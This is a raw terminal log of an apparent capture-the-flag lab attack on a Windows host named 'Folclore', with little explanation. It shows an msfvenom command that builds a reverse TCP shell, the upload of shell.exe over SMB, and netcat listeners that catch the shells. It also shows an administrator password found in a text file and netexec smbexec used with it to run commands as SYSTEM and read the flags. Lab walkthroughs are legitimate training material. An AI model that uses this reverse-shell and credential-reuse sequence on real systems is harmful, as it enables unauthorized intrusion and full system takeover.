└─$ smbclient //192.168.69.9/Viento -U "Quetzalcoatl"
Password for [WORKGROUP\Quetzalcoatl]:
Try "help" to get a list of possible commands.
smb: \> put shell.exe
putting file shell.exe as \shell.exe (3499.8 kb/s) (average 3500.0 kb/s)
smb: \> exit
                                                                                                                                                                                


====================================================================================================================================================================================
┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.69.3] from (UNKNOWN) [192.168.69.9] 49673
dir


    Directorio: C:\Users\Quetzalcoatl


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-r---     28/07/2025  05:34 p. m.                3D Objects                                                           
d-r---     28/07/2025  05:34 p. m.                Contacts                                                             
d-r---     29/07/2025  05:12 a. m.                Desktop                                                              
d-r---     28/07/2025  05:34 p. m.                Documents                                                            
d-r---     29/07/2025  05:13 a. m.                Downloads                                                            
d-r---     28/07/2025  05:34 p. m.                Favorites                                                            
d-r---     29/07/2025  04:33 a. m.                Links                                                                
d-r---     28/07/2025  05:34 p. m.                Music                                                                
d-r---     28/07/2025  05:34 p. m.                Pictures                                                             
d-r---     28/07/2025  05:34 p. m.                Saved Games                                                          
d-r---     28/07/2025  05:34 p. m.                Searches                                                             
d-r---     28/07/2025  05:34 p. m.                Videos                                                               


PS C:\Users\Quetzalcoatl> cd Desktop
PS C:\Users\Quetzalcoatl\Desktop> dir


    Directorio: C:\Users\Quetzalcoatl\Desktop


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----     29/07/2025  05:12 a. m.             54 User.txt                                                             


PS C:\Users\Quetzalcoatl\Desktop> type User.txt
456e20656c207669656e746f2079616365206c6120766572646164


====================================================================================================================================================================================



PS C:\Users\Quetzalcoatl\Downloads> dir


    Directorio: C:\Users\Quetzalcoatl\Downloads


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----     29/07/2025  05:13 a. m.                Actualizacion                                                        


PS C:\Users\Quetzalcoatl\Downloads> cd Actualizacion
PS C:\Users\Quetzalcoatl\Downloads\Actualizacion> ls


    Directorio: C:\Users\Quetzalcoatl\Downloads\Actualizacion


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----     29/07/2025  05:14 a. m.             84 Venganza.txt                                                         


PS C:\Users\Quetzalcoatl\Downloads\Actualizacion> type Venganza.txt
He conseguido la clave del administrador!!!
La guardare para no olvidarla: WwU@49F*


====================================================================================================================================================================================


cd SMB
PS C:\SMB> ls


    Directorio: C:\SMB


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----     01/10/2025  05:41 p. m.                Dia de Muertos                                                       
d-----     01/10/2025  05:32 p. m.                Libertad                                                             
d-----     01/10/2025  05:21 p. m.                Lluvia                                                               
d-----     29/09/2025  11:56 p. m.                Oro                                                                  
d-----     29/07/2025  05:50 a. m.                Santuario                                                            
d-----     01/10/2025  06:30 p. m.                Viento                                                               


PS C:\SMB> cd Viento
PS C:\SMB\Viento> ls


    Directorio: C:\SMB\Viento


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----     29/07/2025  04:27 a. m.            432 Serpiente Emplumada.txt                                              
-a----     01/10/2025  06:30 p. m.            625 shell.ps1                                                            




====================================================================================================================================================================================




┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ netexec smb 192.168.69.9 -u 'Administrador' -p 'WwU@49F*' -X "whoami" --exec-method smbexec
SMB         192.168.69.9    445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) 
SMB         192.168.69.9    445    FOLCLORE         [+] Folclore\Administrador:WwU@49F* (Pwn3d!)
SMB         192.168.69.9    445    FOLCLORE         [+] Executed command via smbexec
SMB         192.168.69.9    445    FOLCLORE         nt authority\system
                                                                                                                                                                                

====================================================================================================================================================================================
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.69.3 LPORT=1234 -f exe -o shell.exe






┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ smbclient //192.168.69.9/Viento -U "Quetzalcoatl"
Password for [WORKGROUP\Quetzalcoatl]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Oct  1 12:18:05 2025
  ..                                  D        0  Wed Oct  1 12:18:05 2025
  Serpiente Emplumada.txt             A      432  Mon Jul 28 22:27:08 2025

                15581256 blocks of size 4096. 10674220 blocks available
smb: \> put  shell.exe





====================================================================================================================================================================================



┌──(kali㉿kali)-[~]
└─$  netexec smb 192.168.69.9 -u Administrador -p "WwU@49F*" -x "C:\SMB\Viento\shell.exe"  --exec-method smbexec
SMB         192.168.69.9    445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False)                                                                                                                        
SMB         192.168.69.9    445    FOLCLORE         [+] Folclore\Administrador:WwU@49F* (Pwn3d!)
SMB         192.168.69.9    445    FOLCLORE         [-] SMBEXEC: Could not retrieve output file, it may have been detected by AV. Please increase the number of tries with the option '--get-output-tries'. If it is still failing, try the 'wmi' protocol or another exec method
SMB         192.168.69.9    445    FOLCLORE         [+] Executed command via smbexec
                                                                                                                                          



┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.69.3] from (UNKNOWN) [192.168.69.9] 49676
Microsoft Windows [Versi�n 10.0.19044.1288]
(c) Microsoft Corporation. Todos los derechos reservados.



C:\Windows\system32>whoami      
whoami
nt authority\system



C:\Windows\system32>cd C:\users\administrador\desktop\
cd C:\users\administrador\desktop\

C:\Users\Administrador\Desktop>dir
dir
 El volumen de la unidad C no tiene etiqueta.
 El n�mero de serie del volumen es: 40AC-0F77

 Directorio de C:\Users\Administrador\Desktop

03/08/2025  09:24 a. m.    <DIR>          .
03/08/2025  09:24 a. m.    <DIR>          ..
03/08/2025  09:24 a. m.                54 Root.txt
               1 archivos             54 bytes
               2 dirs  44,535,881,728 bytes libres

C:\Users\Administrador\Desktop>type Root.txt
type Root.txt
456e20656c207669656e746f2079616365206c6120766572644444
C:\Users\Administrador\Desktop>



====================================================================================================================================================================================


┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ netexec smb 192.168.69.9 -u 'Administrador' -p 'WwU@49F*' -X "type C:\users\administrador\desktop\root.txt" --exec-method smbexec
SMB         192.168.69.9    445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) 
SMB         192.168.69.9    445    FOLCLORE         [+] Folclore\Administrador:WwU@49F* (Pwn3d!)
SMB         192.168.69.9    445    FOLCLORE         [+] Executed command via smbexec
SMB         192.168.69.9    445    FOLCLORE         #< CLIXML
SMB         192.168.69.9    445    FOLCLORE         456e20656c207669656e746f2079616365206c6120766572644444
SMB         192.168.69.9    445    FOLCLORE         <Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparando módulos para el primer uso.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>                                                                                         


